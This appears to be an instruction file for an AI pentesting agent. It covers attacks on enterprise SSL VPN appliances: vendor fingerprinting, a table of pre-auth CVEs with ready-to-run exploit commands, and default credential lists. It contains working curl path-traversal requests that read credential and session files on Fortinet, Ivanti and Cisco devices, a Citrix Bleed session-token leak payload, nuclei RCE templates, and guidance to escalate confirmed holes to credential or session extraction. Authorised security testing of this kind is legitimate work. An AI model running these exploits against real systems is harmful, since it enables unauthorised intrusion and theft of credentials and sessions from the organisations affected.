---
name: hunt-vpn
description: Enterprise SSL VPN attack - vendor fingerprinting, CVE matrix (Cisco, Fortinet, Citrix, Palo Alto, Pulse/Ivanti), default credentials, pre-auth exploit commands. Wiki-first, FIND schema output.
---

# Hunt: Enterprise VPN Appliances

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "VPN appliance FortiGate Cisco Citrix Pulse exploit" via wiki-search MCP -> read matching technique page if found.
```
Apply known CVE payloads and fingerprinting techniques already documented. CVE arsenal: `wiki/cheatsheets/cve-arsenal.md` (Fortinet/Citrix/Ivanti/PAN-OS perimeter CVEs with PoC).


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope
- Read Deadends.md - skip appliance CVEs and paths already marked exhausted

## When to Use
Recon surfaces: `+CSCOE+` paths (Cisco ASA), `Set-Cookie: SVPNCOOKIE=` (Fortinet), `NSC_AAA=` (Citrix), `DSAuthSession=` (Pulse), `BIGipServer*` (F5), ports 443/8443/10443 with VPN login pages.

## Vendor Fingerprinting
```bash
# Cisco ASA / AnyConnect
curl -skI 'https://target/+CSCOE+/logon.html' | head -5

# Fortinet FortiGate
curl -skI 'https://target/remote/login' | grep -i 'set-cookie\|server'

# Citrix NetScaler / Gateway
curl -skI 'https://target/' | grep -i 'nsc_aaa\|netscaler'

# Palo Alto GlobalProtect
curl -skI 'https://target/global-protect/login.esp' | head -5

# Pulse / Ivanti Connect Secure
curl -skI 'https://target/dana-na/auth/url_default/welcome.cgi' | head -5

# F5 BIG-IP
curl -skI 'https://target/my.policy' | grep -i 'bigip\|mrhsession'
```

## CVE Matrix - Pre-Auth Exploits

### Cisco ASA
| CVE | Type | Command |
|-----|------|---------|
| CVE-2020-3452 | Path traversal / file read | `curl --path-as-is 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua'` |
| CVE-2018-0296 | Path traversal / session info | `curl --path-as-is 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua'` |

### Fortinet FortiGate
| CVE | Type | Command |
|-----|------|---------|
| CVE-2018-13379 | Path traversal / credential file | `curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'` |
| CVE-2024-21762 | Pre-auth RCE | `nuclei -u https://target -t cves/2024/CVE-2024-21762.yaml` |
| CVE-2023-27997 | Pre-auth RCE (XORtigate) | `nuclei -u https://target -t cves/2023/CVE-2023-27997.yaml` |

### Citrix NetScaler / ADC
| CVE | Type | Command |
|-----|------|---------|
| CVE-2023-4966 (Citrix Bleed) | Memory leak / session token | See payload below |
| CVE-2023-3519 | Pre-auth RCE | `nuclei -u https://target -t cves/2023/CVE-2023-3519.yaml` |
| CVE-2019-19781 | Path traversal / RCE | `curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'` |

**Citrix Bleed (CVE-2023-4966):**
```bash
HOST=$(python3 -c "print('A' * 24812)")
curl -sk -X POST -H "Host: $HOST" \
  "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
wc -c response.txt  # If >10KB, check for session token material
```

### Palo Alto GlobalProtect
| CVE | Type | Command |
|-----|------|---------|
| CVE-2024-3400 | Pre-auth RCE (OS command injection) | `nuclei -u https://target -t cves/2024/CVE-2024-3400.yaml` |

### Pulse / Ivanti Connect Secure
| CVE | Type | Command |
|-----|------|---------|
| CVE-2019-11510 | Pre-auth file read | `curl -sk 'https://target/dana-na/../dana/html5acc/guacamole/../../../tmp/system.log?/dana/html5acc/guacamole/'` |
| CVE-2024-21887 | RCE (auth required) | `nuclei -u https://target -t cves/2024/CVE-2024-21887.yaml` |

## Default Credential Check
```bash
# After fingerprinting vendor, try these before CVE attempts
# Cisco ASA: admin / cisco, admin / admin
# Fortinet: admin / (blank), admin / admin
# Citrix: nsroot / nsroot
# Palo Alto: admin / admin
# F5: admin / admin, admin / default
```

## Methodology
1. Fingerprint vendor from cookie names, headers, login page content
2. Version fingerprint where possible (JS file paths, meta tags)
3. Try default credentials (non-disruptive)
4. Run nuclei templates for detected vendor + version
5. Test pre-auth path traversal CVEs with `--path-as-is` flag
6. For confirmed vulnerabilities: escalate to credential/session extraction
7. Document with version banner + curl command output as PoC
8. **Distill to wiki (when confirmed):** if the finding is a reusable VPN exploit or a new CVE, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/network/vpn-appliances.md` (create the page on first documentation). Promote later via `scripts/wiki-promote.py`.

## FIND Output

If pre-auth file read or credential dump confirmed:
```
Create Vulns/Research/FIND-XXX-CRITICAL-vpn-preauth-<vendor>-<host>.md
Add row to Vuln-index.md: CRITICAL
```

If default credentials succeed:
```
Create Vulns/Research/FIND-XXX-HIGH-vpn-default-creds-<host>.md
```

If version confirmed vulnerable but no active exploit available:
```
Create Vulns/Research/FIND-XXX-HIGH-vpn-vulnerable-version-<host>.md
Document: version confirmed, CVE applies, PoC not yet available/run
```

If path exhausted:
```
Append to Deadends.md: - [ ] VPN CVEs on <host>: patched, CVE-2024-21762 returns 404, Citrix Bleed response <1KB
```

Report: Status + files created.
